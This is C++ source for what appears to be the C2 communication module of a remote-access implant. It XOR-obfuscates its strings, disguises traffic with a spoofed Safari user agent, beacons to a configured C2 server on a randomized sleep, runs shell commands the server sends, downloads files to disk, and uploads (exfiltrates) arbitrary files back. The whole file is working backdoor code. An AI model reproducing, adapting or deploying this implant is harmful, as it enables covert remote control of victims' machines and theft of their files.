#include "comms.hpp"

namespace Communication {

    namespace HTTP {

        std::string _BuildGETRequestString(std::string route, std::string filename) {
            std::string request = XOR_LIT("GET ") + route;
            if (route == Communication::DOWNLOAD_ROUTE) {
                request += filename;
            } else {
                request += Settings::UUID;
            }
            request += XOR_LIT(" HTTP/1.1\nHost: ") + Settings::C2_ADDRESS + XOR_LIT("\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15\nAccept: */*\nConnection: close\n\n\n");

            return request;
        }

        std::string _BuildPOSTRequestString(std::string route, std::string filename, std::string data) {
            std::string request = XOR_LIT("POST ") + route;

            if (route == Communication::TASK_ROUTE || route == Communication::RESPONSE_ROUTE) {
                request += Settings::UUID;
            }
            request += XOR_LIT(" HTTP/1.1\nHost: ") + Settings::C2_ADDRESS + XOR_LIT("\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15\nAccept: */*\nConnection: close\nContent-Length: ");
            request += std::to_string(data.length()) + "\n";
            request += XOR_LIT("Content-Type: application/x-www-form-urlencoded");

            if (route == Communication::UPLOAD_ROUTE) {
                request += XOR_LIT("\nfilename: ") + filename;
            }

            request += "\n\n" + data;
            
            return request;
        }

        std::vector<unsigned char> SendRequest(const char * type, std::string route, std::string filename, std::string data) {

            std::vector<unsigned char> encrypted_data = Communication::XorCryptToVector(data);
            std::string encoded_data = base64_encode(&encrypted_data[0], encrypted_data.size());

            char http_GET[] = "GET";
            char http_POST[] = "POST";
            std::string requestBody;
            std::vector<unsigned char> response_vector;

            // build HTTP request string
            if (strcmp(type, http_GET) == 0) {
                requestBody = _BuildGETRequestString(route, filename);
            }
            else if (strcmp(type, http_POST) == 0) {
                requestBody = _BuildPOSTRequestString(route, filename, encoded_data);
            }
            else {
                return response_vector;
            }

            // create socket
            int sock_connect_status, bytes_read, sock;
            struct sockaddr_in serv_addr;
            unsigned char buffer[RESP_BUFFER_SIZE] = { 0 };

            // send data to socket
            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                XorLogger::LogError(XOR_LIT("Socket creation error"));
                return response_vector;
            }

            serv_addr.sin_family = AF_INET;
            serv_addr.sin_port = htons(80);

            // convert IPv4 and IPv6 addresses from text to binary form
            if (inet_pton(AF_INET, &Settings::C2_ADDRESS[0], &serv_addr.sin_addr) <= 0) {
                XorLogger::LogError(XOR_LIT("Invalid address"));
                return response_vector;
            }

            // connect to server
            if ((sock_connect_status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
                XorLogger::LogError(XOR_LIT("Connection failed"));
                return response_vector;
            }
            send(sock, requestBody.data(), requestBody.size(), 0);

            // receive data from socket
            while ((bytes_read = read(sock, buffer, RESP_BUFFER_SIZE)) > 0) {
                response_vector.insert(response_vector.end(), buffer, buffer + bytes_read);
            }

            if (bytes_read < 0) {
                XorLogger::LogError(XOR_LIT("No response received from C2"));
                return response_vector;
            } else if (response_vector.size() == 0){
                XorLogger::LogWarning(XOR_LIT("Empty response received from C2"));
            }

            close(sock);
            shutdown(sock, 2);

            return response_vector;

        }

        Communication::HTTP::Response ParseHTTPResponse(std::vector<unsigned char> response_vector, bool is_file) {
            std::string response_str(response_vector.begin(), response_vector.end());
            std::string http_header = response_str.substr(0, response_str.find("\r\n\r\n"));

            // get HTTP status line
            std::string http_status_line = response_str.substr(0, response_str.find("\r\n"));

            // get HTTP protocol and status code
            std::string http_protocol = http_status_line.substr(0, response_str.find(" "));
            std::string http_response_status = http_status_line.substr(response_str.find(" ") + 1);

            // create response object
            Communication::HTTP::Response r;
            r.protocol = http_protocol;
            r.status = http_response_status;

            std::string encoded_body;
            int double_carriages = response_str.find("\r\n\r\n") + 4;

            // if chunked, set the encoded_body to after \r\n after \r\n\r\n, otherwise encoded body should just be after \r\n\r\n
            if (response_str.find(XOR_LIT("chunked")) != std::string::npos) {
                encoded_body = std::string(response_vector.begin() + response_str.find("\r\n", double_carriages) + 2, response_vector.end());
            } else {
                encoded_body = std::string(response_vector.begin() + double_carriages, response_vector.end());
            }
            std::vector<unsigned char> decoded_body = base64_decode(encoded_body);
            std::string decrypted_body = Communication::XorCryptToString(decoded_body);
            nlohmann::json instruction;
            instruction = nlohmann::json::parse(decrypted_body);

            if (is_file) {
                std::string decoded = base64_decode_string(instruction[XOR_LIT("file_bytes")]);
                r.file_bytes = std::vector<unsigned char>(decoded.begin(), decoded.end());
                r.file_size = instruction[XOR_LIT("file_size")];
            } else {
                r.id = instruction[XOR_LIT("id")];
                // parse arg if heartbeat ID
                if (r.id != Communication::HEARTBEAT_ID) {
                    r.arg = instruction[XOR_LIT("arg")];
                }
                // parse payload if download ID
                if (r.id == Communication::DOWNLOAD_ID) {
                    r.payload = instruction[XOR_LIT("payload")];
                }
            }
            
            return r;
        }

    }

    Communication::HTTP::Response _CheckGetResponse(std::vector<unsigned char> response_vector, bool is_file) {
        Communication::HTTP::Response response;
        if (response_vector.size() == 0) {
            XorLogger::LogError(XOR_LIT("No data received from C2"));
            return response;
        }
        try {
            response = Communication::HTTP::ParseHTTPResponse(response_vector, is_file);
            if (!response.status.contains("200")) {
                XorLogger::LogError(XOR_LIT("Received non-200 response from C2: ") + response.status);
                return response;
            }
        }
        catch (std::exception e) {
            XorLogger::LogError(XOR_LIT("Response parsing error: ") + std::string{ e.what() });
        }
        return response;
    }

    // C2 response handler
    void _HandleC2Response(Communication::HTTP::Response response) {
        switch(response.id) {
            case Communication::HEARTBEAT_ID:
                XorLogger::LogDebug(XOR_LIT("Received empty (heartbeat) task"));
                return;
            case Communication::CMD_EXECUTION_ID:
            {
                const char * result = ExecuteCmd(response.arg.c_str());
                Communication::HTTP::SendRequest(XOR_LIT("POST"), Communication::RESPONSE_ROUTE, "", std::string(result));
                return;
            }
            case Communication::DOWNLOAD_ID:
            {
                if (response.arg == "" || response.payload == "") {
                    XorLogger::LogError(XOR_LIT("Error response received from C2, payload or path missing from response\n"));
                    return;
                }

                std::vector<unsigned char> file_vector_response = Communication::HTTP::SendRequest("GET", Communication::DOWNLOAD_ROUTE, response.payload, "");
                Communication::HTTP::Response file_response = _CheckGetResponse(file_vector_response, true);

                if (file_response.file_size == 0) {
                    XorLogger::LogDebug(XOR_LIT("Error response received from C2, file size is 0"));
                    return;
                }

                bool is_download_success = DownloadFile(&file_response.file_bytes[0], file_response.file_bytes.size(), response.arg.c_str());
                if (is_download_success) {
                    XorLogger::LogDebug(XOR_LIT("Wrote downloaded file bytes to: ") + response.arg);
                    Communication::HTTP::SendRequest(XOR_LIT("POST"), Communication::RESPONSE_ROUTE, "", XOR_LIT("Downloaded file successfully"));
                }
                return;
            }
            case Communication::UPLOAD_ID: 
            {
                char * file_content_b64;
                file_content_b64 = UploadFile(response.arg.c_str());
                if (file_content_b64) {
                    std::string file_content_b64_str(file_content_b64);
                    int file_name_index = response.arg.find_last_of("/") + 1;
                    std::string file_name = response.arg.substr(file_name_index);
                    Communication::HTTP::SendRequest(XOR_LIT("POST"), Communication::UPLOAD_ROUTE, file_name, file_content_b64_str);
                }
                else {
                    XorLogger::LogWarning(XOR_LIT("Unable to read ") + response.arg);
                    Communication::HTTP::SendRequest(XOR_LIT("POST"), Communication::RESPONSE_ROUTE, "", std::string(XOR_LIT("Unable to read ")) + response.arg + std::string(XOR_LIT(". File may not exist or we may not have the permissions to read.")));
                }
                return;
            }
            default:
                return;
        }
        return;
    }

    // Sleep randomly between MIN_SLEEP_MS and MAX_SLEEP_MS
    void _Sleep() {
        int sleep = 0;
        time_t randSeed = time(0LL);
        srand(randSeed);

        sleep = rand()%(Settings::MAX_SLEEP_MS - Settings::MIN_SLEEP_MS + 1) + Settings::MIN_SLEEP_MS;
        XorLogger::LogDebug(XOR_LIT("Sleeping for ") + std::to_string(sleep/1000) + XOR_LIT(" seconds"));
        std::this_thread::sleep_for(std::chrono::milliseconds(sleep));
    }

    // C2 comms loop
    void C2CommsLoop(std::string discovery_info) {
        Communication::HTTP::Response response;
        
        // Register with C2
        std::vector<unsigned char> response_vector = Communication::HTTP::SendRequest(XOR_LIT("POST"), Communication::TASK_ROUTE, "", discovery_info);
        response = _CheckGetResponse(response_vector, false);

        // Check server registration response
        if (response.id == -1) {
            XorLogger::LogError(XOR_LIT("Error response from C2 on registration, exiting comms loop: \n") + std::string(response_vector.begin(), response_vector.end()));
            return;
        }

        // Heartbeat loop with C2
        while (true) {
            response_vector = Communication::HTTP::SendRequest(XOR_LIT("GET"), Communication::TASK_ROUTE, "", "");
            response = _CheckGetResponse(response_vector, false);
            if (response.id == -1) {
                XorLogger::LogWarning(XOR_LIT("Error response from C2 on heartbeat, continuing: \n") + std::string(response_vector.begin(), response_vector.end()));
            }
            else {
                Communication::_HandleC2Response(response);
            }
            _Sleep();
        }

        return;
    }

    std::string XorCryptToString(std::vector<unsigned char> input) {
        unsigned char key = 'F'; //Any char will work
        std::string output(input.begin(), input.end());

        for (int i = 0; i < input.size(); i++)
            output[i] = input[i] ^ key;

        return output;
    }

    std::vector<unsigned char> XorCryptToVector(std::string input) {
        unsigned char key = 'F'; //Any char will work
        std::vector<unsigned char> output;

        for (int i = 0; i < input.size(); i++)
            output.push_back(input[i] ^ key);

        return output;
    }

}
